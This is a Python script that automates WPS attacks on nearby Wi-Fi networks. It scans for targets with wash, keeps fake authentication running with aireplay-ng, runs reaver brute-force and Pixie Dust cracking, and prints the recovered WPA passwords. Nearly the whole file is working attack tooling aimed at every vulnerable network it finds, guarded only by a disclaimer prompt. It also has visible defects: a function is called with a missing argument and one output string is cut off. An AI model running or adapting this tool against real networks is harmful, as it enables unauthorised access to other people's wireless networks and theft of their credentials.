import subprocess
import time
import threading
import collections

# Timeout value (in seconds)
REAVER_TIMEOUT = 14400  # 4 hours

disclaimer_string = (
    "DISCLAIMER: Using this tool to attack networks you do not own or that you have no explicit "
    "permission to attack is illegal and highly discouraged.\n"
    "The developer takes no responsibility for the misuse of this tool."
)

fail_keywords = [
    "failed to associate",
    "does not support wps pin",
    "push button mode",
    "timeout occurred",
    "rate limiting",
    "enrollee refused",
    "segmentation fault"
]

# Searches for WPS Vulnerable networks using wash
# Can scan for networks with or without lock
def get_wps_targets(interface, ignoreLocked, timeout):
    targets = []

    try:
        proc = subprocess.Popen(
            ["wash", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text = True
        )

        start_time = time.time()
        for line in proc.stdout:
            if time.time() - start_time > timeout:
                proc.terminate()
                break

            if line.startswith("BSSID") or line.strip() == "":
                continue   # Skip headers and empty lines

            parts = line.split()
            if ignoreLocked == True and parts[-1].lower() == "yes":
                continue   # Skip if it is set to ignore locked

            if len(parts) >= 5:
                bssid = parts[0]
                channel = parts[1]
                targets.append((bssid, channel))

    except Exception as e:
        print("An error was found. Please report.")

    return targets

# Associate to target AP with aireplay
def aireplay_association(interface, mymac, target):
    result = subprocess.run(
        ["aireplay-ng", "-1", "0", "-a", target, "-h", mymac, interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )
    return "Association successful" in result.stdout

# Associating thread
def keep_associating(interface, target, mymac, stop_event):
    while not stop_event.is_set():
        print("[*] Attempting fake auth association...")
        subprocess.run(
            ["aireplay-ng", "-1", "0", "-a", target, "-h", mymac, interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(30)

# Pixie cracking
def crack_wps_with_pixie(interface, target):
    try:
        result = subprocess.run(
            ["reaver", "-i", interface, "-b", target[0], "-c", target[1], "-K", "-N", "-vv"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        output = result.stdout
        if "WPS PIN" in output and "WPA PSK" in output:
            # Extract the PIN and WPA PSK
            parts = output.split()
            wps_pin = parts[3]  # WPS PIN
            wpa_psk = parts[5]  # WPA PSK
            print(f"[+] Pixie Dust Attack success on {target[0]} : {wpa_psk}")

            return (wpa_psk)
        elif "Pixie-Dust attack failed" in output:
            print(f"[!] Pixie Dust Attack Failed on {target[0]}")
            return None
        else:
            print(f"[!] Unexpected output from Reaver on {target[0]}")
            return None
    except Exception as e:
        print(f"[!] Error during Pixie Dust attack on {target[0]}: {e}")
        return None

# Cracks target(s) using reaver
def crack_wps(interface, targets, mymac):
    cracked_pwd = []
    retry_queue = collections.deque(targets)  # Deque for efficient popping from both ends

    while retry_queue:
        target = retry_queue.popleft()
        bssid, channel = target[0], target[1]
    
        print(f"[*] AP being targetted: {bssid}")
        print("[*] Trying to start association thread with aireplay-ng...")

        if not aireplay_association(interface, mymac, bssid):
            print(f"[!] Failed to associate with {bssid}, skipping...")
            continue

        stop_event = threading.Event()
        assoc_thread = threading.Thread(target=keep_associating, args=(interface, bssid, mymac, stop_event))
        assoc_thread.start()

        print("[+] Initial association successful.\n[*] Starting reaver attack, this may take a while...")

        start_time = time.time()  # Track the start time of the attack
        proc = subprocess.Popen(
            ["reaver", "-i", interface, "-b", bssid, "-c", channel, "-N", "-vv"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True
        )

        try:
            # Monitor the running process
            while True:
                elapsed_time = time.time() - start_time
                if elapsed_time > REAVER_TIMEOUT:
                    print(f"[!] Reaver attack on {bssid} exceeded the {REAVER_TIMEOUT / 3600} hour timeout, network was moved to the end of the line...")
                    proc.terminate()  # Terminate the Reaver process if timeout exceeded
                    proc.wait()  # Ensure subprocess cleanup
                    retry_queue.append(target)  # Move the target to the end of the queue for later retry
                    break

                # Check for output from Reaver
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break

                if any(fail_keyword in line.lower() for fail_keyword in fail_keywords):
                    print(f"[!] Attack is failing on {bssid}, skipping...")
                    proc.terminate()
                    proc.wait()
                    break

                if "WPA PSK" in line.upper():
                    parts = line.split()
                    print(f"[+] Success on {bssid} : PASSWORD {parts[3]}.")
                    cracked_pwd.append((bssid, parts[3]))
                    proc.terminate()
                    proc.wait()
                    break

        except Exception as e:
            print(f"[!] Error during Reaver attack on {bssid}: {e}")
        finally:
            stop_event.set()
            assoc_thread.join()
            print("[*] Cleaned up association thread.")

    return cracked_pwd
    
interface = input("[?] What is the name of the interface used for the scan: ")
userin = input("[?] Do you wish to ignore networks with locked WPS? Recommended is yes. (y/n): ")
ignoreLocked = (userin.lower() == "y")
userin = input("[?] How long should the WPS scan go for? (empty for default): ")
timeout = 30 if userin == "" else int(userin)

print("[*] Searching for WPS enabled networks...")
wps_networks = get_wps_targets(interface, ignoreLocked, timeout)

if wps_networks == []:
    print("[!] No networks with WPS enabled were found by wash. Closing script.")
else:
    print(f"[*] {len(wps_networks)} networks with WPS enabled were found.")
    start_attack = start_attack = input(
        f"\n[*]Do you wish to attempt to attack the vulnerable networks found?\n\n{disclaimer_string}\n\n"
        "[*] With this info, do you still wish to launch the attack? (y/n): "
    )

    if start_attack.lower() == "n":
        print("[!] Aborting attack. Stay legal.")
        exit(0)

    print("[*] Attempting to crack all vulnerable networks now. Estimated ti")
        
    successes = crack_wps(interface, wps_networks)

    print(f"[*] Number of successful cracks: {len(successes)}")
        
    for success in successes:
        print(f"bssid: {success[0]} | pwd: {success[1]}")